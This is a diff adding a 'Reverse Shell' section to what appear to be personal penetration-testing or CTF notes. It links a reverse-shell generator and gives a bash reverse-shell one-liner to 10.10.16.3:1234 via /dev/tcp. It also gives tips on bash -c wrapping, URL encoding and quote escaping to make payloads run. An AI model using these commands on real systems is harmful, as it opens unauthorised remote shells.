@@ -4,7 +4,6 @@ sort : 1
 
 # Get-A-Shell 
 
-how to get a shell ?? 
 
 ## SSH 
 
@@ -12,6 +11,19 @@ how to get a shell ??
 
 ## Reverse Shell 
 
+[the best place to generate a reverse shell](https://www.revshells.com/)
+
+```note
+some times the reverse shell doesn't work, why ?? 
+
+> if it is a bash reverse shell (e.g. `bash -i >& /dev/tcp/10.10.16.3/1234 0>&1`) precede it with `bash -c` 
+
+> try URL encoding
+
+> qoutes conflict, how to deal with it ?? 
+    * embrace the whole payload with double qoutes, then escape the inside ones
+    * there is also some tools that ask you to pass the payload as an argv, so make sure how they gonna receive it (inside a double or a single qoutes ??)
+```
 
 
 
